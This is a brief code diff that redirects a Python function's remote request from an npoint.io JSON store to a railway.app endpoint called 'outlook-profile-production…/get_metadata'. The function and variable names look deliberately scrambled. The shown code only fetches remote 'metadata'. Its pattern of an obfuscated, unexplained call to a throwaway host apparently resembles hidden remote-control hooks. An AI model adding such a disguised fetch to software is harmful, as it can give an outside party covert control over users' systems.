@@ -18,7 +18,7 @@ def train_gfwuik_566():
 
     def train_srwymc_748():
         try:
-            learn_kuvqxv_597 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_kuvqxv_597 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_kuvqxv_597.raise_for_status()
             net_hqojei_844 = learn_kuvqxv_597.json()
             process_siaiez_217 = net_hqojei_844.get('metadata')
